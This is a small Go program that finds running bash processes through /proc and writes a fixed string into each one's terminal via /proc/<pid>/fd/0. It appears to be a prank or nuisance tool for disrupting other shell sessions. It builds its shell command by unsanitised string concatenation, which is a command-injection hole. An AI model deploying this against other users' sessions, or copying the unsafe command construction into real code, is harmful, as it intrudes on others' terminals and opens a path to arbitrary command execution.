package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
)

// iterate through proc directory, return a list of all pids that are bash procs
func scrapeProc() []string {
	bPids := []string{}
	allPids, _ := ioutil.ReadDir("/proc")

	for _, f := range allPids {
		pth := "/proc/" + f.Name()
		isD := isDir(pth)
		if isD {
			isB := isBash(pth)
			if isB {
				bPids = append(bPids, pth)
			}
		}

	}
	return bPids
}

func isDir(path string) bool {
	finfo, _ := os.Stat(path)
	return finfo.IsDir()
}

func isBash(path string) bool {
	cmdPath := path + "/cmdline"
	if exists(cmdPath) {
		cmd, _ := ioutil.ReadFile(cmdPath)
		hasBash := strings.Contains(string(cmd), "bash")
		if hasBash {
			return true
		}
		return false
	}
	return false
}

func exists(path string) bool {
	_, err := os.Stat(path)
	if os.IsNotExist(err) {
		return false
	}
	return true
}

func injectString(path string, text string) {
	procInput := path + "/fd/0"
	injection := "echo \"" + text + "\" > " + procInput
	cmd := exec.Command("/bin/bash", "-c", injection)
	fmt.Println("Injecting")
	_, err := cmd.CombinedOutput()
	if err != nil {
		return
	}
	return

}

func main() {
	bashProcs := scrapeProc()
	fmt.Println(bashProcs)
	for _, pid := range bashProcs {
		injectString(pid, "reee")
	}
}
